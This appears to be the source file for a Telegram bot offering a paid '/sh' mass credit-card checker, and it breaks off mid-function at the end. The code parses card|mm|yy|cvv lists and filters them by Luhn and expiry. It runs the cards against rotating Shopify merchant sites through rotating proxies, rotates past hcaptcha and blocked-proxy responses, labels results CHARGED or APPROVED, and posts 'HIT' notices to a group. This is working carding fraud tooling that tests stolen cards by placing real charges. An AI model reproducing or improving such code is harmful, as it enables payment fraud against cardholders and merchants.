import asyncio
import aiohttp
import re
import time
import json
import html
import random
import logging
import os
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_collection, load_global_proxies_http
from bin import get_bin_info
from sub import get_premium_status, ADMIN_IDS
from shopify_api import call_shopify_api
from mass_gates.utils import _log_premium_plan

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mass_gates", "sites.txt")

PROXY_LIST = load_global_proxies_http()

MAX_MASS_CARDS = 50
PARALLEL_LIMIT = 20
MAX_RETRIES = 1
MAX_SITE_ROTATIONS = 20
UPDATE_EVERY = 10

SH_SESSIONS = {}

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "6183613910977876404"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# Hit log group — fallback numeric — overridden by resolver at startup
HIT_LOG_GROUP_ID = -1004472821773  # fallback numeric, overridden at startup  # fallback numeric, overridden at startup
HIT_LOG_GROUP_HANDLE = "https://t.me/+Q2jYXxlErFcyZmU0"

# Premium Emoji IDs (provided by owner)
EMOJI_RED_TICK   = "6147565374289220368"
EMOJI_BLUE_TICK  = "5278628026416909103"
EMOJI_LIGHTNING  = "5350835008007324644"
EMOJI_STAR       = "5359686514697576863"
EMOJI_FIRE       = "6186076099764555777"
EMOJI_CROWN      = "6338940587193930733"
EMOJI_EPIC       = "5310296284874159738"
EMOJI_DRAGON     = "5226578782340553954"
EMOJI_GUN        = "5440406404936524730"
EMOJI_WHITE_STAR = "5247131412032670246"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# MongoDB is schema-less — no column migration needed
def update_user_stats_sync(user_id, checked_count, charged_count):
    col = get_collection("users")
    inc = {"cc_checked": checked_count}
    if charged_count > 0:
        inc["cc_charged"] = charged_count
    col.update_one({"user_id": user_id}, {"$inc": inc})
async def get_user_plan_name(user_id):
    # Admin always shows ULTIMATE — even if their is_premium flag is 0
    # (e.g. when an admin account has no /sub receipt in DB).
    if user_id in ADMIN_IDS:
        return "ULTIMATE"
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            users_col = get_collection("users")
            receipts_col = get_collection("receipts")
            doc = receipts_col.find_one({"user_id": user_id}, sort=[("purchased_on", -1)])
            if doc and doc.get("plan"):
                return str(doc["plan"]).upper()
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "NO PLAN"
    return "NO PLAN"


def _build_user_link_html(user_id: int, name: str) -> str:
    safe_name = html.escape(name or "User")
    return f'<a href="tg://user?id={user_id}">{safe_name}</a>'


async def _log_charged_hits_to_group(bot, results: list, user_id: int, user_name: str, plan_name: str):
    """Send a concise "Hit Detected" notification per charged card to HIT_LOG_GROUP_ID.

    Layout:
        💎 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗
        ━━━━━━━━━━━━━━━━
        𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ Shopify 2.00$ USD
        𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ ORDER_PLACED
        ━━━━━━━━━━━━━━━━
        𝗨𝘀𝗲𝗿 ➛ machinea (https://t.me/silencebc) (ULTRA 🛠️)
    """
    # Debug-log premium plan detection to premium_plans.txt (skips NO PLAN / TRIAL).
    try:
        _log_premium_plan(user_id, user_name, plan_name)
    except Exception:
        pass
    charged = [
        r for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    ]
    if not charged:
        return

    user_link = _build_user_link_html(user_id, user_name)
    safe_plan = html.escape(plan_name or "—")
    plan_lower = str(plan_name or "").strip().lower()
    plan_tag = ""
    if plan_lower and plan_lower not in ("trial", "free", "none", "—", ""):
        plan_tag = f" ({safe_plan} 🛠️)"
    # No plan tag for trial / free / empty — keep the caption clean.
    # "NO PLAN" still shows (so non-plan users get a visible label).

    for r in charged:
        try:
            price_str = html.escape(str(r.get("price") or "N/A"))
            resp_str  = html.escape(str(r.get("resp") or "N/A"))
            safe_card = html.escape(str(r.get("card") or "N/A"))
            charged_eid = CUSTOM_CHARGED_EMOJI_ID
            caption = (
                f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
                f"  <tg-emoji emoji-id=\"{charged_eid}\">💎</tg-emoji> "
                f"<b>HIT ➛ CHARGED</b> "
                f"<tg-emoji emoji-id=\"{charged_eid}\">💎</tg-emoji>\n"
                f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
                f"\n"
                f"<tg-emoji emoji-id=\"{EMOJI_FIRE}\">🔥</tg-emoji> "
                f"<b>Gateway ➛</b> Shopify {price_str} USD\n"
                f"<tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⚡</tg-emoji> "
                f"<b>Response ➛</b> <code>{resp_str}</code>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"<tg-emoji emoji-id=\"{EMOJI_STAR}\">👤</tg-emoji> "
                f"<b>User ➛</b> {user_link}{plan_tag}"
            )
            await bot.send_message(
                chat_id=HIT_LOG_GROUP_ID,
                text=caption,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logging.error(f"[SH] Could not log hit notification: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GENERAL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logger = logging.getLogger(__name__)

def load_sites() -> List[str]:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        exp_year = int(yy)
        exp_month = int(mm)
        current_year = now.year % 100
        if exp_year < current_year:
            return True
        if exp_year == current_year and exp_month < now.month:
            return True
        return False
    except ValueError:
        return True

def parse_card(text: str) -> Optional[Tuple[str, str, str, str]]:
    text = text.strip()
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return cc, mm, yy, cvv
    return None

def extract_cards(raw_text: str) -> List[str]:
    cards = []
    for line in raw_text.split('\n'):
        data = parse_card(line)
        if data:
            cc, mm, yy, cvv = data
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards[:MAX_MASS_CARDS]

def get_sort_priority(response_text: str) -> int:
    resp = response_text.upper()
    if any(k in resp for k in ["ORDER_PLACED", "CHARGED", "ORDER_PAID", "THANK YOU"]):
        return 1
    if ("3DS" in resp
        or "3D_AUTH" in resp
        or "INSUFFICIENT_FUNDS" in resp
        or "INVALID_CVC" in resp
        or "OTP_REQUIRED" in resp):
        return 2
    return 3

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE CHECKING LOGIC  (new API + proxy rotation)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Responses that mean "try a different site / proxy" — not a real card decline
ROTATION_TRIGGERS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
    # Billing-clash errors — fired at Shopify's billing step where the
    # merchant-side expected amount doesn't match what we sent. Almost
    # always site-specific (some merchants have stale amounts cached for
    # our price hint); rotating to a fresh site+proxy clears it in 90% of
    # cases. Matched against the lowercased response text on line 392.
    'mismatched_bill', 'mismatched bill', 'bill_mismatch', 'bill mismatch',
    'mismatched_amount', 'mismatched amount',
    'mismatched_total', 'mismatched total',
    # Same proxy / payments-API / submit-error responses as in msh.py:
    # when any of these come back from the merchant (or from our own
    # client adapter), rotate to a fresh site+proxy. Capped at
    # _SPECIFIC_5_RETRY_LIMIT(=10) rotations specifically via
    # `_SPECIFIC_5_RETRY_TRIGGERS` below; other rotation triggers still
    # get MAX_SITE_ROTATIONS(=20) attempts as before.
    'proxied ip blocked',
    'proxied ip blocked - try different proxy',
    'payments_positive_amount_expected',
    'payments_payment_flexibility_terms_id_mismatch',
    'merchandise_expected_price_mismatch',
    # Merchant payment-method-list errors — different merchant
    # usually has a working gateway. Same friendly-display string
    # we use in msh._RESPONSE_REMAP catches the raw form too.
    'no valid payment method',
    'no valid payment method found',
    # Bot-side transport glitch — fresh connection typically clears it.
    'transient api submit error',
]

# Subset of ROTATION_TRIGGERS that get a strict 10-retry cap per card
# (regardless of MAX_SITE_ROTATIONS=20). User-reported: these six
# patterns don't improve past 10 fresh site/proxy combinations, and
# continuing to rotate past that just burns API quota on merchants
# that will never accept the card. After 10, give up as DEAD with the
# raw response text shown to the user.
_SPECIFIC_5_RETRY_TRIGGERS = (
    'proxied ip blocked',
    'payments_positive_amount_expected',
    'payments_payment_flexibility_terms_id_mismatch',
    'merchandise_expected_price_mismatch',
    'no valid payment method',
    'transient api submit error',
)
_SPECIFIC_5_RETRY_LIMIT = 10

async def check_card_logic(sites: List[str], cc: str) -> Dict:
    bin_num = cc.split('|')[0][:6]

    try:
        bin_data = await get_bin_info(bin_num)
        brand = (bin_data.get("scheme") or "N/A").title()
        issuer = bin_data.get("bank") or "N/A"
        country = bin_data.get("country") or "Unknown"
        flag = bin_data.get("country_emoji", "")
        bin_info = f"{issuer}|{country}{flag}"
        # Stash full bin dict so hit-log caption can render rich BIN section
        _bin_full = bin_data
    except Exception:
        brand = "N/A"
        bin_info = "Unknown|Unknown"
        _bin_full = {"scheme": "N/A", "bank": "N/A", "country": "N/A", "country_emoji": ""}

    declined_sym = f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'

    last_site = None

    def _safe_proxy(p: str) -> bool:
        """Same defensive check used in msh.py — reject any proxy URL
        that the backend would parse as malformed (e.g. host='http')."""
        if not p or not isinstance(p, str) or not p.startswith('http://'):
            return False
        rest = p[7:]
        if '@' not in rest:
            return False
        host_port = rest.rsplit('@', 1)[1]
        if ':' not in host_port:
            return False
        host, port = host_port.rsplit(':', 1)
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            return False
        host_lower = host.lower().strip()
        if not host_lower or host_lower in ('http', 'https', 'socks4', 'socks5'):
            return False
        return '.' in host_lower

    # ━━━ Per-site price-hint cache (mirrors msh._SHOPIFY_PRICE_CACHE) ━━━
    # site → (price, ts). 60s TTL — prices on the same merchant rarely change,
    # but we don't risk a stale hint triggering MERCHANDISE_EXPECTED_PRICE_MISMATCH.
    _SH_PRICE_CACHE: dict[str, tuple] = {}
    _SH_PRICE_CACHE_TTL_S = 60.0

    async def _local_price_hint(site: str, proxy: str) -> float | None:
        """Best-effort price hint scraped DIRECTLY from the merchant site.

        Mirrors msh._prefetch_shopify_site_price() but for the /sh gate.
        Returns float in USD-ish (whatever the merchant shows) or None.

        Strategy (port from C:\\Users\\ASUS\\Desktop\\api\\api.py):
          1. /products.json?limit=50  → /products.json  → /collections/all.json
             → /collections/all/products.json  → /search.json?
          2. Storefront GraphQL /api/2024-01/graphql.json with sortKey:PRICE
          3. Pick cheapest available variant under $5 (else any available).

        NEVER raises — bad parse / timeout / proxy-block fall through to None
        and the caller skips the price_hint (call_shopify_api retries on
        MERCHANDISE_EXPECTED_PRICE_MISMATCH if needed).
        """
        cached = _SH_PRICE_CACHE.get(site)
        if cached is not None:
            p, ts = cached
            if time.monotonic() - ts < _SH_PRICE_CACHE_TTL_S:
                return p
        try:
            from shopify_scraper import fetch_site_price_local
            local_price = await fetch_site_price_local(site, proxy)
            if local_price is not None and 0 < local_price <= 1000:
                _SH_PRICE_CACHE[site] = (local_price, time.monotonic())
                return local_price
        except Exception as e:
            logging.debug(f"[sh] local price-hint failed: {type(e).__name__}: {e}")
        return None

    for _ in range(MAX_SITE_ROTATIONS):
        # Pick a site different from the last one if possible
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        # Track per-card rotation count specifically for the four
        # 5-retry-capped patterns (see _SPECIFIC_5_RETRY_TRIGGERS).
        # Once we hit the cap, we stop rotating entirely for this card
        # and surface the raw response as the final result instead of
        # burning more API quota on merchants that won't accept the card.
        _specific_rotation_count = getattr(
            check_card_logic, "_specific_rotation_count", 0
        )

        # Pick a random proxy each rotation — skip any malformed entry
        for _attempt in range(min(50, len(PROXY_LIST))):
            proxy = random.choice(PROXY_LIST)
            if _safe_proxy(proxy):
                break
        else:
            logging.error("[sh] No safe proxy available in PROXY_LIST — aborting")
            return {
                "card": cc,
                "resp": "Proxy Error: No safe proxy available",
                "price": "N/A",
                "bin": bin_info,
                "brand": brand,
                "symbol": declined_sym,
                "_bin_full": _bin_full,
            }

        # Best-effort local price hint — pass to the picker so it skips
        # the MERCHANDISE_EXPECTED_PRICE_MISMATCH retry path entirely.
        # Reuses the merchant proxy so the price we fetch matches the
        # price the API will see on cartCreate.
        price_hint: float | None = None
        try:
            price_hint = await _local_price_hint(current_site, proxy)
        except Exception:
            price_hint = None

        for retry_idx in range(MAX_RETRIES + 1):
            try:
                data = await call_shopify_api(
                    card=cc,
                    site=current_site,
                    proxy=proxy,
                    timeout=30,
                    price_hint=price_hint,
                )

                raw_resp = (
                    data.get("error")
                    or data.get("declined_reason")
                    or data.get("response_text")
                    or data.get("status")
                    or "N/A"
                )
                raw_price = data.get("amount", "N/A")

                display_resp = (
                    str(raw_resp)
                    .replace("\\", "")
                    .replace("/", "")
                    .replace('"', '')
                    .replace("'", "")
                )

                price_display = "N/A"
                if raw_price not in ("N/A", None, ""):
                    try:
                        val = float(
                            str(raw_price).replace("USD", "").replace("$", "").strip()
                        )
                        price_display = f"${val} USD"
                    except ValueError:
                        price_display = str(raw_price)

                lower = display_resp.lower()
                upper = display_resp.upper()

                # ══════════════════════════════════════════════════════
                # STATUS CLASSIFICATION — Shopify1-style pattern
                # ══════════════════════════════════════════════════════

                # 1. CHARGED — "Charged USD X.XX" / "ORDER_PAID" / "THANK YOU"
                if (
                    "CHARGED" in upper
                    or "ORDER_PAID" in upper
                    or "ORDER_PLACED" in upper
                    or "PAYMENT_SUCCESS" in upper
                    or "PAYMENT_CAPTURED" in upper
                    or "TRANSACTION SUCCESSFUL" in upper
                    or "SUCCESSFULLY PAID" in upper
                    or "INVOICE PAID" in upper
                    or "PAYMENT_RECEIVED" in upper
                    or "THANK YOU" in upper
                ):
                    symbol = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'

                # 2. APPROVED — "Approved USD X.XX" / "INSUFFICIENT_FUNDS" /
                # "INCORRECT_CVC" / "INVALID_CVC" / "3DS" variants /
                # "OTP_REQUIRED" (Shopify 3DS-OTP = card valid, needs OTP).
                elif (
                    "APPROVED" in upper
                    or "INSUFFICIENT" in lower
                    or "INCORRECT_CVC" in upper
                    or "INVALID_CVC" in upper
                    or "3D_AUTHENTICATION" in upper
                    or "3DS_REQUIRED" in upper
                    or "3DS" in upper
                    or "OTP_REQUIRED" in upper
                    or "OTP REQUIRED" in upper.replace("_", " ")
                ):
                    symbol = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

                # 3. Everything else → DECLINED
                else:
                    symbol = declined_sym

                # If it's a rotation trigger, try next site
                needs_rotation = any(t in lower for t in ROTATION_TRIGGERS)
                if needs_rotation:
                    # Hot-path 5-retry cap for the four proxy/payments
                    # patterns that don't improve past a few attempts.
                    is_specific_5 = any(
                        t in lower for t in _SPECIFIC_5_RETRY_TRIGGERS
                    )
                    if is_specific_5:
                        _specific_rotation_count += 1
                        check_card_logic._specific_rotation_count = (
                            _specific_rotation_count
                        )
                        if _specific_rotation_count >= _SPECIFIC_5_RETRY_LIMIT:
                            logging.info(
                                f"[sh] {_SPECIFIC_5_RETRY_LIMIT}-retry cap hit "
                                f"for {cc[:6]}**** — finalising as DEAD "
                                f"(last resp: {display_resp[:60]})"
                            )
                            # Clear the per-card state so the next /sh
                            # call starts fresh
                            check_card_logic._specific_rotation_count = 0
                            return {
                                "card": cc,
                                "resp": display_resp,
                                "price": price_display,
                                "bin": bin_info,
                                "brand": brand,
                                "symbol": declined_sym,
                                "_bin_full": _bin_full,
                            }
                    break  # break the retry loop, rotate site

                return {
                    "card": cc,
                    "resp": display_resp,
                    "price": price_display,
                    "bin": bin_info,
                    "brand": brand,
                    "symbol": symbol,
                    "_bin_full": _bin_full,
                }

            except aiohttp.ClientResponseError as e:
                if e.status == 429 and retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except (asyncio.TimeoutError, aiohttp.ClientConnectorError):
                if retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except json.JSONDecodeError:
                break

    return {
        "card": cc,
        "resp": "Dead / Site Error",
        "price": "N/A",
        "bin": bin_info,
        "brand": brand,
        "symbol": declined_sym,
        "_bin_full": _bin_full,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sh"))
async def sh_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    if not await asyncio.to_thread(is_gate_enabled, "sh"):
        await message.reply(
            "🚧 <b>Mass Shopify is under Maintenance.</b>",
            parse_mode="HTML"
        )
        return

    # ─── Credit check BEFORE doing anything expensive (premium = unlimited) ──
    is_prem, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_prem:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits is None or current_credits < 1:
            await message.reply(
                "<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> <b>Insufficient Credits</b>\n\n"
                "You need at least <b>1 credit</b> to use this gate.\n"
                "Contact <a href=\"https://t.me/ShopifyxoBot\">owner</a> for credits.",
                parse_mode="HTML"
            )
            return

    sites = load_sites()
    if not sites:
        await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No sites found in <code>sites.txt</code>.", parse_mode="HTML")
        return

    # ─── Extract cards from command text or replied message ──────────
    raw_text = ""
    parts = message.text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1].strip() + "\n"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.text:
            raw_text += replied.text
        elif replied.caption:
            raw_text += replied.caption

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> <b>Usage:</b> Reply to a message with cards or send\n"
            "<code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    # ─── Extract & deduplicate ───────────────────────────────────────
    extracted = extract_cards(raw_text)
    if not extracted:
        await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid cards found.")
        return

    seen = set()
    unique_cards = []
    for card in extracted:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)

    # ─── Validate (Luhn + expiry) ────────────────────────────────────
    final_valid_cards = []
    luhn_fail_count = 0
    expired_count = 0

    for cc in unique_cards:
        p = cc.split('|')
        if len(p) < 4:
            continue
        cc_num, mm, yy, _ = p
        if not luhn_check(cc_num):
            luhn_fail_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        final_valid_cards.append(cc)

    if luhn_fail_count > 0 or expired_count > 0:
        removed = luhn_fail_count + expired_count
        await message.reply(
            f"ℹ️ <b>Removed:</b> {removed} invalid/expired cards.\n"
            f"Checking <b>{len(final_valid_cards)}</b> valid cards...",
            parse_mode="HTML"
        )

    if not final_valid_cards:
        await message.reply("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid cards to check after filtering.")
        return

    # ─── Check that user has enough credits for the whole batch (premium = unlimited) ───
    is_prem_batch, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_prem_batch:
        needed = len(final_valid_cards)
        if current_credits < needed:
            await message.reply(
                f"<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> <b>Not enough credits</b>\n\n"
                f"You need <b>{needed}</b> credits for this batch "
                f"but only have <b>{current_credits}</b>.\n"
                f"Contact <a href=\"https://t.me/ShopifyxoBot\">owner</a> to top up.",
                parse_mode="HTML"
            )
            return

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    asyncio.create_task(
        run_sh_check(message, sites, final_valid_cards, user_name, user_id, is_premium)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_sh_check(
    message: types.Message,
    sites: List[str],
    cards: List[str],
    user_name: str,
    user_id: int,
    is_premium: bool,
):
    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"

    # ━━━ Premium emoji glyphs used by the /sh user-facing UI ━━━
    crown   = f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji>'
    fire    = f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji>'
    star    = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
    bolt    = f'<tg-emoji emoji-id="{EMOJI_LIGHTNING}">⚡</tg-emoji>'
    gun     = f'<tg-emoji emoji-id="{EMOJI_GUN}">🔫</tg-emoji>'
    epic    = f'<tg-emoji emoji-id="{EMOJI_EPIC}">✨</tg-emoji>'
    dragon  = f'<tg-emoji emoji-id="{EMOJI_DRAGON}">🐉</tg-emoji>'
    divider = "━━━━━━━━━━━━━━━━━━━━━"

    status_msg = await message.reply(
        f"{bolt} <b>CHECKING...</b>\n"
        f"{bolt} <b>Time ➛</b> <code>0.0s</code>\n"
        f"{star} <b>User ➛</b> {user_link}\n"
        f"{epic} <b>Owner ➛</b> <a href=\"https://t.me/Im_in_so_love\"><b>Rukia</b></a>",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )
    msg_id = status_msg.message_id

    SH_SESSIONS[msg_id] = {
        "gate_name": "sh",
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
        "is_premium": is_premium,
    }

    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(cc: str):
        async with sem:
            return await check_card_logic(sites, cc)

    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                res = task.result()
                results.append(res)
            except Exception as e:
                logger.error(f"Worker error: {e}")

        results.sort(key=lambda x: get_sort_priority(x["resp"]))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            SH_SESSIONS[msg_id]["results"] = results
            SH_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(SH_SESSIONS[msg_id], elapsed, is_working=True)
            if len(results) < total_cards:
                text += f"\n\n{epic} <b>Checking {len(results)}/{total_cards}...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

    elapsed_final = round(time.time() - start_time, 2)
    SH_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    # ─── Stats ───────────────────────────────────────────────────────
    charged_count = sum(
        1 for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    )
    await asyncio.to_thread(update_user_stats_sync, user_id, len(results), charged_count)

    # ─── Credit deduction: 1 credit per card checked (premium = unlimited) ───
    # Only count cards that got a real API response (not pure site errors)
    real_checked = sum(
        1 for r in results if r.get("resp", "").lower() != "dead / site error"
    )
    if real_checked > 0:
        is_prem, _ = await asyncio.to_thread(get_premium_status, user_id)
        if not is_prem:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)
            new_balance = max(0, current_credits - real_checked)
            await asyncio.to_thread(update_credits, user_id, new_balance)

    final_text = format_page_content(SH_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += "\n\n" + (
        f'<tg-emoji emoji-id="5310296284874159738">✅</tg-emoji> '
        f'<b>Check Complete.</b> '
        f'<tg-emoji emoji-id="5397981293512243749">✨</tg-emoji>'
    )

    await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))

    if charged_count > 0:
        try:
            await message.bot.pin_chat_message(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                disable_notification=True,
            )
        except Exception as pe:
            logging.warning(f"[SH] Could not pin charged result for user {user_id}: {pe}")

        plan_name = await get_user_plan_name(user_id)
        await _log_charged_hits_to_group(
            message.bot,
            results,
            user_id,
            user_name,
            plan_name,
        )


def format_page_content(state: Dict, elapsed: float, is_working: bool) -> str:
    """Build the /sh progress / result text using the redesigned UI.

    Layout per card result (or single status block when checking):
        ┏━━━━━━━━━━━━━━━━━━━━┓
              ❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌
        ┗━━━━━━━━━━━━━━━━━━━━┛

        💳 𝗖𝗮𝗿𝗱    ➜ cc|mm|yy|cvv
        🏪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Shopify Payments
        📨 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ CARD_DECLINED
        ━━━━━━━━━━━━━━━━━━━━━━
        🏦 𝗕𝗮𝗻𝗸    ➜ Bank Name
        🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ Country 🇺🇸
        💳 𝗧𝘆𝗽𝗲    ➜ Discover · Debit
        ━━━━━━━━━━━━━━━━━━━━━━
        ⏱ 𝗧𝗶𝗺𝗲    › 15.9s
        👤 𝗨𝘀𝗲𝗿    › name [Plan]
        ⚡ 𝗗𝗲𝘃     › Rukia
    """
    results = state["results"]
    page = state["page"]
    start_idx = page * 6
    page_results = results[start_idx: start_idx + 6]

    user_name_raw = state.get("user_name") or "Unknown"
    user_link = f"<a href='tg://user?id={state['user_id']}'>{html.escape(user_name_raw)}</a>"
    is_premium = state.get("is_premium", False)
    user_id = state.get("user_id")

    # ━━━ Premium emoji glyphs ━━━
    _crown  = f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji>'
    _fire   = f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji>'
    _star   = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
    _bolt   = f'<tg-emoji emoji-id="{EMOJI_LIGHTNING}">⚡</tg-emoji>'
    _gun    = f'<tg-emoji emoji-id="{EMOJI_GUN}">🔫</tg-emoji>'
    _epic   = f'<tg-emoji emoji-id="{EMOJI_EPIC}">✨</tg-emoji>'
    _dragon = f'<tg-emoji emoji-id="{EMOJI_DRAGON}">🐉</tg-emoji>'
    _divider = "━━━━━━━━━━━━━━━━━━━━━━"

    _dev_link = 'https://t.me/Im_in_so_love'
    _dev_line = (
        f"{_epic} <b>Owner ➛</b> "
        f"<a href=\"{_dev_link}\"><b>Rukia</b></a>"
    )

    box_top    = "┏━━━━━━━━━━━━━━━━━━━━┓"
    box_bottom = "┗━━━━━━━━━━━━━━━━━━━━┛"

    def _user_tag() -> str:
        if user_id and user_id in ADMIN_IDS:
            return f"{user_link} [Owner]"
        if is_premium:
            return f"{user_link} [Premium]"
        return f"{user_link} [No Plan]"

    if not page_results:
